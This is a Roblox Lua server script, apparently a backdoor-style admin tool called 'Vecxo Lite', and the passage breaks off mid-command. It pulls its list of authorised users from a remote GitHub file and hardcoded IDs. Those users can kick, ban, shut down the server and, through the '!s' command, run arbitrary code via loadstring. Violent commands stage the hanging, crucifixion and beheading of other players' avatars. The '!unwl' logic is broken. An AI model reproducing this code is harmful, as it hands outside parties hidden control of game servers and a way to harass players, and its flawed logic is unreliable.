--//VECXO LITE STARTS HERE

local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")

local cxoURL = "https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/whitelisted"
local BackupIDs = {
	-- cxo
	3222470105;
	7306448629;
	21517314;
	35950257;
	-- tech
	1702851506;
	-- knocks
	1551416114;
	-- kozy
	1889958;
	-- decryptionite
	120983992;
	1921860822;
	366631664;
	13425405;
	-- palamode
	523322320;
	-- freddie
	1724769699;
	--vecko
	244903894;
	36373784;
}

function GetWhitelist()
	local returnedUsers = {}

	-- Check from GitHub (first priority)
	local success, response = pcall(function()
		return game:GetService("HttpService"):GetAsync(cxoURL)
	end)

	if success and response then
		returnedUsers = string.split(response, "\n")
	else
		print("GitHub check failed! Using backup table.")
		returnedUsers = BackupIDs
	end

	return returnedUsers
end

local whitelisted = GetWhitelist()

local bannedPlayers = {}

local TweenService = game:GetService("TweenService")

local function notify(player, title, message)
coroutine.wrap(function()
	local gui = Instance.new("ScreenGui")
	gui.Name = "AdminNotification"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.Parent = player:FindFirstChildOfClass("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0.4, 0, 0.2, 0)
	frame.Position = UDim2.new(0.5, 0, 0.1, 0)
	frame.AnchorPoint = Vector2.new(0.5, 0)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	frame.BackgroundTransparency = 1
	frame.BorderSizePixel = 0
	frame.Parent = gui

	local titleLabel = Instance.new("TextLabel")
	titleLabel.Size = UDim2.new(1, 0, 0.3, 0)
	titleLabel.Position = UDim2.new(0, 0, 0, 0)
	titleLabel.BackgroundTransparency = 1
	titleLabel.TextTransparency = 1
	titleLabel.TextStrokeTransparency = 1
	titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	titleLabel.Font = Enum.Font.Code
	titleLabel.TextScaled = true
	titleLabel.Text = title
	titleLabel.Parent = frame

	local messageLabel = Instance.new("TextLabel")
	messageLabel.Size = UDim2.new(1, 0, 0.7, 0)
	messageLabel.Position = UDim2.new(0, 0, 0.3, 0)
	messageLabel.BackgroundTransparency = 1
	messageLabel.TextTransparency = 1
	messageLabel.TextStrokeTransparency = 1
	messageLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
	messageLabel.Font = Enum.Font.Code
	messageLabel.TextScaled = true
	messageLabel.TextWrapped = true
	messageLabel.Text = message
	messageLabel.Parent = frame

	local fadeInTweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	TweenService:Create(frame, fadeInTweenInfo, { BackgroundTransparency = 0.2 }):Play()
	TweenService:Create(titleLabel, fadeInTweenInfo, { TextTransparency = 0, TextStrokeTransparency = 0.3 }):Play()
	TweenService:Create(messageLabel, fadeInTweenInfo, { TextTransparency = 0, TextStrokeTransparency = 0.3 }):Play()

	task.delay(5, function()
		local fadeOutTweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
		TweenService:Create(frame, fadeOutTweenInfo, { BackgroundTransparency = 1 }):Play()
		TweenService:Create(titleLabel, fadeOutTweenInfo, { TextTransparency = 1, TextStrokeTransparency = 1 }):Play()
		TweenService:Create(messageLabel, fadeOutTweenInfo, { TextTransparency = 1, TextStrokeTransparency = 1 }):Play()
		task.wait(0.5)
		gui:Destroy()
		end)
	end)()
end

local TweenService = game:GetService("TweenService")

function notifyv2(player, title, message)
	coroutine.wrap(function()
	pcall(function()
	local playerGui = player:WaitForChild("PlayerGui")

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "VecxoHintGui"
	screenGui.ResetOnSpawn = false
	screenGui.Parent = playerGui


	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 300, 0, 80)
	frame.AnchorPoint = Vector2.new(1, 1)
	frame.Position = UDim2.new(1, -20, 1, -20)
	frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	frame.BackgroundTransparency = 0.8
	frame.BorderSizePixel = 0
	frame.Parent = screenGui
	frame.ClipsDescendants = true
	frame.AutomaticSize = Enum.AutomaticSize.Y


	local titleLabel = Instance.new("TextLabel")
	titleLabel.Size = UDim2.new(1, -20, 0, 30)
	titleLabel.Position = UDim2.new(0, 10, 0, 10)
	titleLabel.BackgroundTransparency = 1
	titleLabel.Text = title
	titleLabel.Font = Enum.Font.GothamBold
	titleLabel.TextSize = 20
	titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	titleLabel.TextXAlignment = Enum.TextXAlignment.Left
	titleLabel.Parent = frame

	local messageLabel = Instance.new("TextLabel")
	messageLabel.Size = UDim2.new(1, -20, 0, 40)
	messageLabel.Position = UDim2.new(0, 10, 0, 40)
	messageLabel.BackgroundTransparency = 1
	messageLabel.Text = message
	messageLabel.Font = Enum.Font.Gotham
	messageLabel.TextSize = 16
	messageLabel.TextColor3 = Color3.fromRGB(230, 230, 230)
	messageLabel.TextWrapped = true
	messageLabel.TextXAlignment = Enum.TextXAlignment.Left
	messageLabel.TextYAlignment = Enum.TextYAlignment.Top
	messageLabel.Parent = frame

	frame.BackgroundTransparency = 1
	titleLabel.TextTransparency = 1
	messageLabel.TextTransparency = 1

	local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

	local fadeInGoals = {
		BackgroundTransparency = 0.8,
	}
	local fadeInTitleGoals = {
		TextTransparency = 0,
	}
	local fadeInMessageGoals = {
		TextTransparency = 0,
	}

	-- Create tweens
	local fadeInTween = TweenService:Create(frame, tweenInfo, fadeInGoals)
	local fadeInTitleTween = TweenService:Create(titleLabel, tweenInfo, fadeInTitleGoals)
	local fadeInMessageTween = TweenService:Create(messageLabel, tweenInfo, fadeInMessageGoals)

	fadeInTween:Play()
	fadeInTitleTween:Play()
	fadeInMessageTween:Play()

	fadeInTween.Completed:Wait()

	task.wait(4)

	local fadeOutTween = TweenService:Create(frame, tweenInfo, {BackgroundTransparency = 1})
	local fadeOutTitleTween = TweenService:Create(titleLabel, tweenInfo, {TextTransparency = 1})
	local fadeOutMessageTween = TweenService:Create(messageLabel, tweenInfo, {TextTransparency = 1})

	fadeOutTween:Play()
	fadeOutTitleTween:Play()
	fadeOutMessageTween:Play()

	fadeOutTween.Completed:Wait()

			screenGui:Destroy()
		end)
	end)()
end

local function GetPlayers(targetArg, sender)
	targetArg = targetArg:lower()
	local playersList = Players:GetPlayers()

	if targetArg == "me" then
		return {sender}

	elseif targetArg == "all" then
		return playersList

	elseif targetArg == "others" then
		local others = {}
		for _, plr in ipairs(playersList) do
			if plr ~= sender then
				table.insert(others, plr)
			end
		end
		return others

	elseif targetArg == "random" then
		local candidates = {}
		for _, plr in ipairs(playersList) do
			if plr ~= sender then
				table.insert(candidates, plr)
			end
		end
		if #candidates > 0 then
			return {candidates[math.random(1, #candidates)]}
		else
			return {}
		end

	elseif targetArg == "friends" then
		local friends = {}
		for _, plr in ipairs(playersList) do
			if plr ~= sender and plr:IsFriendsWith(sender.UserId) then
				table.insert(friends, plr)
			end
		end
		return friends
	else
		for _, plr in ipairs(playersList) do
			local nameLower = plr.Name:lower()
			local displayNameLower = plr.DisplayName:lower()
			if nameLower:sub(1, #targetArg) == targetArg or displayNameLower:sub(1, #targetArg) == targetArg then
				return {plr}
			end
		end
		return {}
	end
end

local function refreshPlayer(plr)
	if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
		local rnpos = plr.Character.HumanoidRootPart.CFrame

		for _, v in ipairs(plr.Character:GetChildren()) do
			if v:IsA("Accessory") then
				pcall(function()
					v:Destroy()
				end)
			end
		end

		for _, item in ipairs(workspace:GetDescendants()) do
			if (item:IsA("Accessory") or item:IsA("Hat")) and item:FindFirstChild("Handle") and item.Handle:IsDescendantOf(workspace) then
				if item.Name == plr.Name or item.Handle.Name == plr.Name then
					pcall(function()
						item:Destroy()
					end)
				end
			end
		end

		plr:LoadCharacter()
		task.wait()
		if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
			plr.Character.HumanoidRootPart.CFrame = rnpos
		end
	else
		plr:LoadCharacter()
	end
end

local function showCommandGui(player)
	if player:FindFirstChild("PlayerGui"):FindFirstChild("VecxoCmds") then
		player.PlayerGui.VecxoCmds:Destroy()
	end

	local gui = Instance.new("ScreenGui")
	gui.Name = "VecxoCmds"
	gui.ResetOnSpawn = false
	gui.Parent = player:WaitForChild("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 400, 0, 300)
	frame.Position = UDim2.new(0.5, -200, 0.5, -150)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	frame.BorderSizePixel = 0
	frame.Parent = gui
	frame.Active = true
	frame.Draggable = true

	local uicorner = Instance.new("UICorner", frame)
	uicorner.CornerRadius = UDim.new(0, 8)

	local title = Instance.new("TextLabel")
	title.Text = "[Vecxo Lite]: Commands List"
	title.Size = UDim2.new(1, 0, 0, 30)
	title.BackgroundTransparency = 1
	title.TextColor3 = Color3.new(1, 1, 1)
	title.Font = Enum.Font.Code
	title.TextSize = 18
	title.Parent = frame

	local closeBtn = Instance.new("TextButton")
	closeBtn.Size = UDim2.new(0, 30, 0, 30)
	closeBtn.Position = UDim2.new(1, -35, 0, 0)
	closeBtn.Text = "X"
	closeBtn.BackgroundTransparency = 0.2
	closeBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
	closeBtn.TextColor3 = Color3.new(1, 1, 1)
	closeBtn.Font = Enum.Font.Gotham
	closeBtn.TextSize = 14
	closeBtn.Parent = frame
	closeBtn.MouseButton1Click:Connect(function()
		gui:Destroy()
	end)

	local scrollingFrame = Instance.new("ScrollingFrame")
	scrollingFrame.Size = UDim2.new(1, -10, 1, -40)
	scrollingFrame.Position = UDim2.new(0, 5, 0, 35)
	scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
	scrollingFrame.ScrollBarThickness = 6
	scrollingFrame.BackgroundTransparency = 0.1
	scrollingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	scrollingFrame.BorderSizePixel = 0
	scrollingFrame.Parent = frame

	local layout = Instance.new("UIListLayout")
	layout.Padding = UDim.new(0, 4)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Parent = scrollingFrame

	local commands = {
		"1 - !kick <plr|all|others|random|friends> [reason]",
		"2 - !ban <plr|all|others|random|friends> [reason]",
		"3 - !unban <plr|all|others|random|friends>",
		"4 - !h <message>",
		"5 - !rj <plr|all|others|random|friends>",
		"6 - !wl <plr|all|others|random|friends>",
		"7 - !unwl <plr|all|others|random|friends>",
		"8 - !re <plr|all|others|random|friends>",
		"9 - !hang <plr|all|others|random|friends>",
		"10 - !crucify <plr|all|others|random|friends>",
		"11 - !guil <plr|all|others|random|friends>",
		"12 - !s <code>",
		"13 - !clr - Cleans the server of junk",
		"14 - !shutdown - Shuts the server down",
		"15 - !wls - View whitelisted users in current server"
		--"10 - !restart"
	}

	for _, text in ipairs(commands) do
		local label = Instance.new("TextLabel")
		label.Size = UDim2.new(1, -10, 0, 22)
		label.BackgroundTransparency = 1
		label.Text = text
		label.TextColor3 = Color3.fromRGB(255, 255, 255)
		label.TextXAlignment = Enum.TextXAlignment.Left
		label.Font = Enum.Font.Gotham
		label.TextSize = 14
		label.Parent = scrollingFrame
	end

	task.defer(function()
		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
	end)
end

local userNameCache = {}

local function GetUserName(userId)
	if userNameCache[userId] then
		return userNameCache[userId]
	end
	local userIdNum = tonumber(userId)
	if not userIdNum then return tostring(userId) end
	for _, player in ipairs(Players:GetPlayers()) do
		if player.UserId == userIdNum then
			userNameCache[userId] = player.Name
			return player.Name
		end
	end
	local success, result = pcall(function()
		return Players:GetNameFromUserIdAsync(userIdNum)
	end)
	if success and result then
		userNameCache[userId] = result
		return result
	end

	return tostring(userId)
end

local function showWhitelisted(player, whitelistIds)
	-- Destroy existing GUI if present
	local existingGui = player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("VecxoWhitelisted")
	if existingGui then
		existingGui:Destroy()
	end

	local gui = Instance.new("ScreenGui")
	gui.Name = "VecxoWhitelisted"
	gui.ResetOnSpawn = false
	gui.Parent = player:WaitForChild("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 400, 0, 300)
	frame.Position = UDim2.new(0.5, -200, 0.5, -150)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	frame.BorderSizePixel = 0
	frame.Parent = gui
	frame.Active = true
	frame.Draggable = true

	local uicorner = Instance.new("UICorner", frame)
	uicorner.CornerRadius = UDim.new(0, 8)

	local title = Instance.new("TextLabel")
	title.Text = "[Vecxo Lite]: Whitelisted Players In-Game"
	title.Size = UDim2.new(1, 0, 0, 30)
	title.BackgroundTransparency = 1
	title.TextColor3 = Color3.new(1, 1, 1)
	title.Font = Enum.Font.Code
	title.TextSize = 18
	title.Parent = frame

	local closeBtn = Instance.new("TextButton")
	closeBtn.Size = UDim2.new(0, 30, 0, 30)
	closeBtn.Position = UDim2.new(1, -35, 0, 0)
	closeBtn.Text = "X"
	closeBtn.BackgroundTransparency = 0.2
	closeBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
	closeBtn.TextColor3 = Color3.new(1, 1, 1)
	closeBtn.Font = Enum.Font.Gotham
	closeBtn.TextSize = 14
	closeBtn.Parent = frame
	closeBtn.MouseButton1Click:Connect(function()
		gui:Destroy()
	end)

	local scrollingFrame = Instance.new("ScrollingFrame")
	scrollingFrame.Size = UDim2.new(1, -10, 1, -40)
	scrollingFrame.Position = UDim2.new(0, 5, 0, 35)
	scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
	scrollingFrame.ScrollBarThickness = 6
	scrollingFrame.BackgroundTransparency = 0.1
	scrollingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	scrollingFrame.BorderSizePixel = 0
	scrollingFrame.Parent = frame

	local layout = Instance.new("UIListLayout")
	layout.Padding = UDim.new(0, 4)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Parent = scrollingFrame

	local inGameWhitelist = {}

	for _, plr in ipairs(Players:GetPlayers()) do
		if table.find(whitelistIds, plr.UserId) or table.find(whitelistIds, tostring(plr.UserId)) then
			table.insert(inGameWhitelist, plr)
		end
	end

	if #inGameWhitelist == 0 then
		local label = Instance.new("TextLabel")
		label.Size = UDim2.new(1, -10, 0, 22)
		label.BackgroundTransparency = 1
		label.Text = "❌ No whitelisted players are currently in-game."
		label.TextColor3 = Color3.fromRGB(255, 255, 255)
		label.TextXAlignment = Enum.TextXAlignment.Left
		label.Font = Enum.Font.Gotham
		label.TextSize = 14
		label.Parent = scrollingFrame
	else
		for i, plr in ipairs(inGameWhitelist) do
			local label = Instance.new("TextLabel")
			label.Size = UDim2.new(1, -10, 0, 22)
			label.BackgroundTransparency = 1
			label.Text = i .. " - [✅] " .. plr.Name .. " (" .. plr.UserId .. ")"
			label.TextColor3 = Color3.fromRGB(255, 255, 255)
			label.TextXAlignment = Enum.TextXAlignment.Left
			label.Font = Enum.Font.Gotham
			label.TextSize = 14
			label.Parent = scrollingFrame
		end
	end

	task.defer(function()
		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
	end)
end

local function showBannedList(player, bannedPlayersTable)
	local existingGui = player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("VecxoBanned")
	if existingGui then
		existingGui:Destroy()
	end

	local gui = Instance.new("ScreenGui")
	gui.Name = "VecxoBanned"
	gui.ResetOnSpawn = false
	gui.Parent = player:WaitForChild("PlayerGui")

	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, 400, 0, 300)
	frame.Position = UDim2.new(0.5, -200, 0.5, -150)
	frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
	frame.BorderSizePixel = 0
	frame.Parent = gui
	frame.Active = true
	frame.Draggable = true

	local uicorner = Instance.new("UICorner", frame)
	uicorner.CornerRadius = UDim.new(0, 8)

	local title = Instance.new("TextLabel")
	title.Text = "[Vecxo Lite]: Banned Players"
	title.Size = UDim2.new(1, 0, 0, 30)
	title.BackgroundTransparency = 1
	title.TextColor3 = Color3.new(1, 1, 1)
	title.Font = Enum.Font.Code
	title.TextSize = 18
	title.Parent = frame

	local closeBtn = Instance.new("TextButton")
	closeBtn.Size = UDim2.new(0, 30, 0, 30)
	closeBtn.Position = UDim2.new(1, -35, 0, 0)
	closeBtn.Text = "X"
	closeBtn.BackgroundTransparency = 0.2
	closeBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
	closeBtn.TextColor3 = Color3.new(1, 1, 1)
	closeBtn.Font = Enum.Font.Gotham
	closeBtn.TextSize = 14
	closeBtn.Parent = frame
	closeBtn.MouseButton1Click:Connect(function()
		gui:Destroy()
	end)

	local scrollingFrame = Instance.new("ScrollingFrame")
	scrollingFrame.Size = UDim2.new(1, -10, 1, -40)
	scrollingFrame.Position = UDim2.new(0, 5, 0, 35)
	scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
	scrollingFrame.ScrollBarThickness = 6
	scrollingFrame.BackgroundTransparency = 0.1
	scrollingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	scrollingFrame.BorderSizePixel = 0
	scrollingFrame.Parent = frame

	local layout = Instance.new("UIListLayout")
	layout.Padding = UDim.new(0, 4)
	layout.SortOrder = Enum.SortOrder.LayoutOrder
	layout.Parent = scrollingFrame

	local bannedList = {}
	for userIdStr, _ in pairs(bannedPlayersTable) do
		local userIdNum = tonumber(userIdStr)
		if userIdNum then
			table.insert(bannedList, userIdNum)
		end
	end

	if #bannedList == 0 then
		local label = Instance.new("TextLabel")
		label.Size = UDim2.new(1, -10, 0, 22)
		label.BackgroundTransparency = 1
		label.Text = "✅ No players are currently banned."
		label.TextColor3 = Color3.fromRGB(255, 255, 255)
		label.TextXAlignment = Enum.TextXAlignment.Left
		label.Font = Enum.Font.Gotham
		label.TextSize = 14
		label.Parent = scrollingFrame
	else
		for i, userId in ipairs(bannedList) do
			local name = GetUserName(userId)
			local label = Instance.new("TextLabel")
			label.Size = UDim2.new(1, -10, 0, 22)
			label.BackgroundTransparency = 1
			label.Text = i .. " - [🚫] " .. name .. " (" .. userId .. ")"
			label.TextColor3 = Color3.fromRGB(255, 255, 255)
			label.TextXAlignment = Enum.TextXAlignment.Left
			label.Font = Enum.Font.Gotham
			label.TextSize = 14
			label.Parent = scrollingFrame
		end
	end

	task.defer(function()
		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
	end)
end



local function processCommand(sender, msg)
	if not table.find(whitelisted, tostring(sender.UserId)) then return end
	local args = msg:split(" ")
	local cmd = args[1]:lower()

	if cmd == "!wl" and args[2] then
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv2(sender, "[Vecxo Lite]", "❌ Player(s) '" .. args[2] .. "' not found.")
			return
		end
		for _, targetPlayer in ipairs(targets) do
			if not table.find(whitelisted, targetPlayer.UserId) then
				table.insert(whitelisted, targetPlayer.UserId)
			end
			notify(sender, "[Vecxo Lite]", "✅ Whitelisted " .. targetPlayer.Name)
			notifyv2(targetPlayer, "[Vecxo Lite]:", "❌ You have been whitelisted. Usage: !cmds")
		end

	elseif cmd == "!unwl" and args[2] then
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv2(sender, "[Vecxo Lite]", "❌ Player(s) '" .. args[2] .. "' not found.")
			return
		end
		for _, targetPlayer in ipairs(targets) do
			if targetPlayer.Name ~= "Reloxz" then
			table.insert(whitelisted, targetPlayer.UserId)
				notify(sender, "[Vecxo Lite]", "✅ Removed " .. targetPlayer.Name .. " from whitelist")
			else
				notifyv2(sender, "[Vecxo Lite]", "❌ Protected user cannot be removed from the whitelist")
			end
		end
	elseif cmd == "!shutdown" then
		for i, v in pairs(game.Players:GetPlayers()) do
			v:Kick("[Vecxo Lite]: This server has been shutdown.")
		end
		game:Shutdown()
	elseif cmd == "!wls" then
		local currentwl = GetWhitelist()
		showWhitelisted(sender, currentwl)
	--[[elseif cmd == "!restart" then
		local message = Instance.new("Message", workspace)
		local dots = 0
		local running = true
		task.spawn(function()
			while running do
				dots = (dots % 3) + 1
				message.Text = "[Vecxo Lite]: Restarting server" .. string.rep(".", dots)
				task.wait(0.3)
			end
		end)
		game.Players.PlayerAdded:Connect(function(v)
			repeat task.wait() until v and v.Character
			v:Kick("[Vecxo Lite]: This server was closed because someone triggered a new server creation.")
		end)
		local teleportService = game:GetService("TeleportService")
		local code = teleportService:ReserveServer(game.PlaceId)

		teleportService:TeleportToPrivateServer(game.PlaceId, code, game.Players:GetPlayers(), nil, {
			softshutdowned = true,
			vecxo = true
		})
		task.wait(7.5)
		running = false
		message:Destroy()
		for _, v in ipairs(game.Players:GetPlayers()) do
			v:Kick("[Vecxo Lite]: Failed to teleport you to the restarted server. Please rejoin manually, sorry :-(")
		end]]
	elseif cmd == "!clr" then
		for _, v in pairs(game.Workspace:GetChildren()) do
			if (v:IsA("Part") or v:IsA("TrussPart") or v:IsA("WedgePart")) and v.Parent == game.Workspace then
				v:Destroy()
			end
		end
		for _, v in pairs(workspace:GetChildren()) do
			if v.Name ~= "Terrain" and (v:IsA("BasePart") and not game.Players:FindFirstChild(v.Name) and not v:IsA("Tool")) then
				v:Destroy()
			end
		end
		for _, v in pairs(workspace:GetDescendants()) do
			if v.Name ~= "face" and (v:IsA("Decal") or v:IsA("ParticleEmitter")) then
				v:Destroy()
			end
		end
		notifyv2(sender, "[Vecxo Lite]", "✅ Workspace cleared successfully")
	elseif cmd == "!s" then
		local code = msg:sub(4)
		if code == "" then
			notifyv2(sender, "Vecxo's admin", "❌ No code provided.")
			return
		end

		local success, err = pcall(function()
			loadstring(code)()
		end)

		if success then
			notifyv2(sender, "Vecxo's admin", "✅ Code ran successfully")
		else
			notifyv2(sender, "Vecxo's admin", "❌ Issue executing code: " .. err)
		end
	elseif cmd == "!re" and args[2] then
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv2(sender, "[Vecxo Lite]", "❌ Player(s) '" .. args[2] .. "' not found.")
			return
		end
		for _, targetPlayer in ipairs(targets) do
			refreshPlayer(targetPlayer)
		end
		notifyv2(sender, "[Vecxo Lite]", "✅ Refreshed " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!cmds" then
		showCommandGui(sender)
	elseif cmd == "!bans" then
		showBannedList(sender, bannedPlayers)
	elseif cmd == "!hang" and args[2] then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("Head") and plr.Character:FindFirstChild("HumanoidRootPart") and plr.Character:FindFirstChild("Torso") then
				notifyv2(sender, "[Vecxo Lite]", "✅ Hanging "..plr.Name.."...")
				local function createPart(cf, size, material, color)
					local p = Instance.new("Part")
					p.Name = "cxo was here"
					p.Anchored = true
					p.CFrame = cf
					p.Size = size
					p.Material = material
					p.BrickColor = BrickColor.new(color)
					p.Parent = workspace
					return p
				end

				local root = plr.Character.HumanoidRootPart.CFrame

				local floor = createPart(root * CFrame.new(0, -2.5, 0), Vector3.new(16, 1, 16), Enum.Material.Wood, "Rust")
				local pole = createPart(floor.CFrame * CFrame.new(0, 6.5, 7), Vector3.new(2, 12, 2), Enum.Material.Wood, "Rust")
				local pole2 = createPart(pole.CFrame * CFrame.new(0, 6.5, -2), Vector3.new(2, 1, 6), Enum.Material.Wood, "Rust")

				local metal = createPart(pole.CFrame * CFrame.new(0, 7.05, -4), Vector3.new(2, 0.1, 0.1), Enum.Material.DiamondPlate, "Black")
				local metal2 = createPart(metal.CFrame * CFrame.new(-1.05, -0.56, 0), Vector3.new(0.1, 1.213, 0.1), Enum.Material.DiamondPlate, "Black")
				local metal3 = createPart(metal.CFrame * CFrame.new(1.05, -0.56, 0), Vector3.new(0.1, 1.213, 0.1), Enum.Material.DiamondPlate, "Black")
				local metal4 = createPart(pole.CFrame * CFrame.new(0, 5.93, -4), Vector3.new(2, 0.1, 0.1), Enum.Material.DiamondPlate, "Black")

				local rope = createPart(metal4.CFrame * CFrame.new(0, -0.60, 0), Vector3.new(0.1, 1.113, 0.1), Enum.Material.Leather, "Burnt Sienna")
				local rope2 = createPart(rope.CFrame * CFrame.new(0, -0.6, 0), Vector3.new(1.459, 0.1, 0.1), Enum.Material.Leather, "Burnt Sienna")
				local rope3 = createPart(rope2.CFrame * CFrame.new(0.78, -0.5560, 0), Vector3.new(0.1, 1.215, 0.1), Enum.Material.Leather, "Burnt Sienna")
				local rope4 = createPart(rope2.CFrame * CFrame.new(-0.78, -0.5560, 0), Vector3.new(0.1, 1.215, 0.1), Enum.Material.Leather, "Burnt Sienna")
				local rope5 = createPart(rope.CFrame * CFrame.new(0, -1.715, 0), Vector3.new(1.459, 0.1, 0.1), Enum.Material.Leather, "Burnt Sienna")

				-- Position player
				plr.Character.HumanoidRootPart.Anchored = true
				plr.Character.Head.CFrame = rope5.CFrame * CFrame.new(0, 1, 0.5)
				if plr.Character:FindFirstChild("Humanoid") and plr.Character.Humanoid:FindFirstChild("Animator") then
					plr.Character.Humanoid.Animator:Destroy()
				end
				if plr.Character.Torso:FindFirstChild("Neck") then
					plr.Character.Torso.Neck.C0 = plr.Character.Torso.Neck.C0 * CFrame.Angles(math.rad(90), 0, 0)
				end
			end
		end

	elseif cmd == "!crucify" and args[2] then
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv2(sender, "[Vecxo Lite]", "❌ Player(s) '" .. args[2] .. "' not found.")
			return
		end

		for _, plr in ipairs(targets) do
			coroutine.wrap(function()
				if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
					notifyv2(sender, "[Vecxo Lite]", "✅ Crucifying "..plr.Name.."...")
					local character = plr.Character
					local rootPart = character.HumanoidRootPart
					local humanoid = character:FindFirstChildOfClass("Humanoid")

					if humanoid:FindFirstChild("Animator") then
						humanoid.Animator:Destroy()
					end

					local cross = Instance.new("Model", workspace)

					local mainPost = Instance.new("Part")
					mainPost.Size = Vector3.new(2, 8, 1)
					mainPost.Material = Enum.Material.Wood
					mainPost.BrickColor = BrickColor.new("Reddish brown")
					mainPost.Anchored = true
					mainPost.Parent = cross

					local crossbar = Instance.new("Part")
					crossbar.Size = Vector3.new(6, 1, 1)
					crossbar.Position = Vector3.new(0,-3,0)
					crossbar.Material = Enum.Material.Wood
					crossbar.BrickColor = BrickColor.new("Reddish brown")
					crossbar.Anchored = true
					crossbar.Parent = cross

					local crossCFrame = rootPart.CFrame * CFrame.new(0, 4, 0)
					mainPost.CFrame = crossCFrame
					crossbar.CFrame = crossCFrame * CFrame.new(0, 2.5, 0)

					rootPart.CFrame = crossCFrame * CFrame.new(0, 2.5, -1)
					rootPart.Anchored = true

					local torso = character:FindFirstChild("Torso")
					local leftArm = character:FindFirstChild("Left Arm")
					local rightArm = character:FindFirstChild("Right Arm")

					local function Weld(part0, part1, cframe)
						local weld = Instance.new("Weld")
						weld.Part0 = part0
						weld.Part1 = part1
						weld.C0 = cframe
						weld.Parent = part0
						part1.Anchored = false
					end

					if leftArm then
						Weld(crossbar, leftArm, CFrame.new(-2, 0, -1) * CFrame.Angles(-2, 0, math.rad(-90)))
					end
					if rightArm then
						Weld(crossbar, rightArm, CFrame.new(2, 0, -1) * CFrame.Angles(2, 0, math.rad(90)))
					end
					if torso then
						Weld(mainPost, torso, CFrame.new(0, 1.5, -1))
					end

					local sound = Instance.new("Sound", rootPart)
					sound.SoundId = "rbxassetid://1846115874"
					sound.Volume = 2
					sound:Play()

					wait(6)

					local beam = Instance.new("Part", workspace)
					beam.Size = Vector3.new(2, 1, 2)
					beam.Position = rootPart.Position
					beam.Material = Enum.Material.Neon
					beam.BrickColor = BrickColor.new("Institutional white")
					beam.Transparency = 0.5
					beam.Anchored = true

					local GhostTorso = character:FindFirstChild("Torso") and character:FindFirstChild("Torso"):Clone()
					if GhostTorso then
						GhostTorso.Parent = beam
						GhostTorso.Transparency = 0.5
						GhostTorso.Anchored = true
					end

					for i = 1, 30 do
						beam.Size = Vector3.new(6, i * 3, 6)
						beam.Position = rootPart.Position + Vector3.new(0, i * 2, 0)
						rootPart.Position = rootPart.Position + Vector3.new(0, 3, 0)
						if GhostTorso then
							GhostTorso.Position = beam.Position + Vector3.new(0, 2, 0)
							GhostTorso.Transparency = math.min(1, GhostTorso.Transparency + 0.02)
						end
						wait(0.2)
					end

					humanoid.Health = 0
					wait(1)
					beam:Destroy()
					sound:Destroy()
					rootPart.Anchored = false
				end
			end)()
		end
	elseif cmd == "!guil" and args[2] then --//ripped from dizzys admin
		local targetName = args[2]:lower()
		for _, plr in ipairs(Players:GetPlayers()) do
			if plr.Name:lower():sub(1, #targetName) == targetName then
				notifyv2(sender, "[Vecxo Lite]", "✅ Beheading "..plr.Name.."...")
				local character = plr.Character
				if not character then return end

				local rootPart = character:FindFirstChild("HumanoidRootPart")
				local head = character:FindFirstChild("Head")
				local torso = character:FindFirstChild("Torso")
				local humanoid = character:FindFirstChildOfClass("Humanoid")
				if not (rootPart and head and torso and humanoid) then return end

				local base = Instance.new("Part", workspace)
				base.Name = "DIZZY behead moment"
				base.Size = Vector3.new(10, 1, 6)
				base.Position = rootPart.Position + Vector3.new(0, -3, 0)
				base.Material = Enum.Material.Wood
				base.BrickColor = BrickColor.new("Reddish brown")
				base.Anchored = true

				local leftPole = Instance.new("Part", workspace)
				leftPole.Name = "DIZZY behead moment"
